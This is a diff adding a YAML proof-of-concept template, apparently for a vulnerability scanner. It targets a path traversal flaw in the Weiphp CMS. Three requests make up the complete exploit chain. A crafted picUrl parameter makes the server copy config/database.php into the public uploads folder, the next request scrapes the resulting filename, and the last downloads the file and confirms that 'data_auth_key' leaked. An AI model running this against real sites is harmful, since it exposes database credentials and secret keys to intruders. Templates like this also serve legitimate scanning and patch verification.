@@ -1,0 +1,41 @@
+id: poc-yaml-weiphp-path-traversal
+info:
+  name: Weiphp 目录穿越漏洞
+  severity: medium
+  tags:
+  - 目录遍历
+  finger: Weiphp
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: POST
+  path: /public/index.php/material/Material/_download_imgage?media_id=1&picUrl=./../config/database.php
+  headers: {}
+  data: '"1":1'
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200
+  output: []
+- method: GET
+  path: /public/index.php/home/file/user_pics
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200
+  output:
+  - regex_match(body,"/public/uploads/picture/(?P<img>.+?)\"")
+- method: GET
+  path: /public/uploads/picture/{{.img}}
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, "data_auth_key") && contains(body,
+    "WeiPHP")
+  output: []
